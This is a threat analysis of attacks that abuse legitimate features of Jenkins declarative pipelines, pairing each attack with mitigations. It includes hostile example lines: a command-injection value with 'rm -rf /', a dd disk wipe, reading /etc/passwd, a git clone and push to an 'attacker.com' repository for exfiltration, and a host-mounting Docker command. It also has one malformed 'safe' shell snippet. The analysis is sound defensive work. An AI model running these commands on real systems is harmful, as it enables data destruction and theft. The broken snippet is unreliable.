# Deep Analysis: Abuse Legitimate Pipeline Features (Jenkins Pipeline Model Definition Plugin)

## 1. Objective

This deep analysis aims to identify, understand, and propose mitigations for attacks that exploit the *intended* functionality of the Jenkins `pipeline-model-definition-plugin`.  We focus on how legitimate features, designed for flexibility and automation, can be subverted for malicious purposes.  The goal is to provide actionable recommendations for developers and security engineers to harden Jenkins pipelines against these sophisticated attacks.

## 2. Scope

This analysis focuses specifically on the `pipeline-model-definition-plugin` and its core features.  We will consider:

*   **Declarative Pipeline Syntax:**  How the Groovy-based DSL (Domain Specific Language) can be manipulated.
*   **Shared Libraries:**  The risks associated with using and trusting shared pipeline libraries.
*   **Built-in Steps and Directives:**  How standard pipeline steps (e.g., `sh`, `git`, `docker`) can be abused.
*   **Environment Variables and Credentials:**  How attackers might leverage or exfiltrate sensitive information.
*   **Agent/Node Selection:**  How attackers might target specific, less secure nodes.
*   **Post-build Actions:**  How actions like archiving artifacts or triggering downstream jobs can be misused.
*  **Script Security Plugin Integration:** How the Script Security plugin's approval mechanism can be bypassed or its limitations exploited.

We *exclude* vulnerabilities that are purely due to misconfiguration (e.g., overly permissive user roles) or underlying Jenkins core vulnerabilities *unless* they are specifically exacerbated by the pipeline plugin.  We also exclude attacks that rely on *unintended* behavior (bugs) in the plugin itself, as those fall under a different branch of the attack tree.

## 3. Methodology

This analysis will employ a combination of techniques:

1.  **Code Review:**  We will examine the plugin's source code (available on GitHub) to understand how features are implemented and identify potential weaknesses.  This is crucial for understanding the *intended* behavior.
2.  **Documentation Analysis:**  We will thoroughly review the official Jenkins Pipeline documentation and the plugin's specific documentation to identify potential attack vectors based on documented features.
3.  **Threat Modeling:**  We will use a threat modeling approach, considering various attacker profiles (insider threats, external attackers with compromised credentials, etc.) and their potential goals.
4.  **Known Exploit Analysis:**  We will research publicly known exploits and vulnerabilities related to Jenkins Pipelines and the `pipeline-model-definition-plugin` to understand real-world attack patterns.  This includes reviewing CVEs and security advisories.
5.  **Hypothetical Attack Scenario Development:**  We will construct realistic attack scenarios based on the identified features and potential weaknesses.
6.  **Mitigation Brainstorming:** For each identified attack vector, we will propose specific mitigation strategies, focusing on a defense-in-depth approach.

## 4. Deep Analysis of "Abuse Legitimate Pipeline Features"

This section details specific attack vectors and their mitigations, categorized by the pipeline feature being abused.

### 4.1.  Declarative Pipeline Syntax Manipulation

**Attack Vector 1:  Code Injection via String Interpolation**

*   **Description:**  Declarative Pipelines often use string interpolation (e.g., `sh "echo ${SOME_VARIABLE}"`) to dynamically construct commands.  If `SOME_VARIABLE` is controlled by an attacker (e.g., through a build parameter or an upstream job), they can inject arbitrary shell commands.
*   **Example:**
    ```groovy
    pipeline {
        agent any
        parameters {
            string(name: 'COMMAND', defaultValue: 'ls -l', description: 'Command to execute')
        }
        stages {
            stage('Execute') {
                steps {
                    sh "echo ${params.COMMAND}" // Vulnerable!
                }
            }
        }
    }
    ```
    An attacker could set `COMMAND` to `ls -l; rm -rf /`.
*   **Mitigation:**
    *   **Avoid String Interpolation for Shell Commands:**  Use the `script` step and Groovy's built-in command execution capabilities (e.g., `['sh', '-c', 'echo', params.COMMAND]`.toList()`) which handle arguments safely.  This prevents shell injection.
    *   **Input Validation and Sanitization:**  If string interpolation is unavoidable, rigorously validate and sanitize any user-supplied input.  Use whitelisting (allowing only known-good characters) rather than blacklisting.
    *   **Least Privilege:** Ensure the Jenkins agent runs with the minimum necessary permissions.

**Attack Vector 2:  Bypassing Script Security via Approved Scripts**

*   **Description:** The Script Security plugin allows administrators to approve specific Groovy scripts.  Attackers might find ways to modify approved scripts (if they have write access to the Jenkinsfile or shared library) or to trick the approval system.
*   **Example:** An attacker with limited permissions might be able to modify a seemingly harmless, approved script in a shared library to include malicious code.
*   **Mitigation:**
    *   **Strict Access Control to Shared Libraries:**  Implement rigorous access control and code review processes for shared libraries.  Use SCM (Source Code Management) and require multiple approvals for changes.
    *   **Regular Audits of Approved Scripts:**  Periodically review the list of approved scripts to ensure they haven't been tampered with.
    *   **Consider Sandbox Limitations:** Even approved scripts run within a sandbox.  Understand the limitations of the sandbox and design pipelines accordingly.  The sandbox prevents direct access to the Jenkins master's filesystem and JVM, but it doesn't prevent all potential attacks (e.g., network access).

### 4.2.  Shared Library Abuse

**Attack Vector 3:  Malicious Shared Library**

*   **Description:**  An attacker could introduce a malicious shared library or compromise an existing one.  This library could then be used by multiple pipelines, amplifying the impact.
*   **Example:**  A shared library could contain a function that appears to perform a legitimate task (e.g., deploying to a staging environment) but also exfiltrates credentials or installs a backdoor.
*   **Mitigation:**
    *   **Trusted Library Sources:**  Only load shared libraries from trusted sources (e.g., a private, well-secured Git repository).
    *   **Code Review and Signing:**  Require code review and digital signatures for all shared library code.
    *   **Dependency Management:**  Use a dependency management system to track and audit the versions of shared libraries used.
    *   **Library Load Restrictions:** Configure Jenkins to only allow loading libraries from specific, whitelisted locations.

**Attack Vector 4:  Implicit Shared Library Loading**

*  **Description:** Jenkins can be configured to implicitly load shared libraries. If an attacker can place a malicious library in a location that Jenkins automatically searches, they can inject code without any explicit `library` directive in the pipeline.
* **Mitigation:**
    * **Disable Implicit Loading:** Avoid implicit shared library loading. Explicitly declare all used libraries using the `@Library` annotation or the `library` step.
    * **Restrict Search Paths:** If implicit loading is necessary, tightly control the directories Jenkins searches for libraries.

### 4.3.  Built-in Steps and Directives Abuse

**Attack Vector 5:  `sh` Step Abuse (Beyond Injection)**

*   **Description:**  Even without direct code injection, the `sh` step can be used to execute system commands that could be harmful.  This includes accessing sensitive files, modifying system configurations, or launching denial-of-service attacks.
*   **Example:**  `sh "cat /etc/passwd"` (information disclosure), `sh "dd if=/dev/zero of=/dev/sda bs=1M"` (disk wiping).
*   **Mitigation:**
    *   **Least Privilege (Agent Level):**  Run Jenkins agents with the lowest possible privileges on the host system.  Use containers (Docker) to isolate agents.
    *   **Resource Limits:**  Configure resource limits (CPU, memory, disk I/O) for Jenkins agents to prevent denial-of-service attacks.
    *   **Monitoring and Auditing:**  Monitor the execution of `sh` steps and audit logs for suspicious commands.

**Attack Vector 6:  `git` Step Abuse**

*   **Description:**  The `git` step can be used to clone malicious repositories or to exfiltrate data by pushing to an attacker-controlled repository.
*   **Example:**  `git url: 'https://attacker.com/malicious-repo.git'` (cloning a repo with malicious hooks), `git url: 'https://attacker.com/exfiltration-repo.git'; git push` (exfiltrating data).
*   **Mitigation:**
    *   **Repository Whitelisting:**  Configure Jenkins to only allow cloning from trusted Git repositories.
    *   **Credential Management:**  Use Jenkins' credential management system to securely store Git credentials.  Avoid hardcoding credentials in pipelines.
    *   **Network Restrictions:**  Restrict network access for Jenkins agents to prevent communication with untrusted repositories.

**Attack Vector 7: Docker Step Abuse**

* **Description:** If the pipeline uses Docker, an attacker could run malicious containers, escape the container, or exploit vulnerabilities in the Docker daemon.
* **Example:** `docker run -v /:/host ... malicious-image` (mounting the host filesystem), running a container with `--privileged` flag.
* **Mitigation:**
    * **Trusted Images:** Only use Docker images from trusted registries.
    * **Image Scanning:** Scan Docker images for vulnerabilities before using them in pipelines.
    * **Least Privilege (Docker):** Avoid running containers with the `--privileged` flag. Use user namespaces and seccomp profiles to restrict container capabilities.
    * **Docker Daemon Security:** Secure the Docker daemon itself (e.g., using TLS, restricting access).

### 4.4.  Environment Variables and Credentials Abuse

**Attack Vector 8:  Credential Exposure**

*   **Description:**  Pipelines often need access to credentials (passwords, API keys, SSH keys).  An attacker could try to expose these credentials through logging, environment variables, or by exfiltrating them.
*   **Example:**  `sh "echo ${MY_SECRET_CREDENTIAL}"` (printing a credential to the console log), `sh "env"` (dumping all environment variables).
*   **Mitigation:**
    *   **Jenkins Credential Management:**  Use Jenkins' built-in credential management system to store and access credentials securely.
    *   **Masking:**  Use the `maskPasswords` option in the pipeline to prevent credentials from being printed to the console log.
    *   **Avoid Hardcoding:**  Never hardcode credentials in pipelines or shared libraries.
    * **Environment Variable Sanitization:** Be cautious about passing credentials as environment variables to external processes.

### 4.5.  Agent/Node Selection Abuse

**Attack Vector 9:  Targeting Weak Agents**

*   **Description:**  An attacker could specify that a pipeline stage should run on a specific, less secure agent (e.g., an agent with weaker access controls or outdated software).
*   **Example:**  `agent { label 'legacy-agent' }` (targeting a known vulnerable agent).
*   **Mitigation:**
    *   **Agent Hardening:**  Ensure all Jenkins agents are properly hardened and regularly updated.
    *   **Label Management:**  Use labels carefully and restrict access to sensitive labels.
    *   **Dynamic Agent Provisioning:**  Use dynamic agent provisioning (e.g., with Kubernetes or cloud plugins) to ensure agents are created with a consistent, secure configuration.

### 4.6 Post-build Actions Abuse
**Attack Vector 10: Archive Artifacts Manipulation**

* **Description:** An attacker could modify or replace legitimate artifacts with malicious ones during the archiving process.
* **Example:** Replacing a legitimate JAR file with a backdoored version.
* **Mitigation:**
    * **Checksum Verification:** Calculate and verify checksums (e.g., SHA-256) of artifacts before and after archiving.
    * **Artifact Repository Security:** Store archived artifacts in a secure artifact repository (e.g., Artifactory, Nexus) with access controls and audit logging.
    * **Digital Signatures:** Digitally sign artifacts to ensure their integrity and authenticity.

**Attack Vector 11: Triggering Malicious Downstream Jobs**

* **Description:** An attacker could configure a pipeline to trigger a downstream job that performs malicious actions.
* **Example:** Triggering a job that deploys malware to a production environment.
* **Mitigation:**
    * **Access Control for Downstream Jobs:** Restrict access to sensitive downstream jobs.
    * **Parameter Validation:** Validate parameters passed to downstream jobs.
    * **Job Configuration Review:** Regularly review the configuration of downstream jobs.
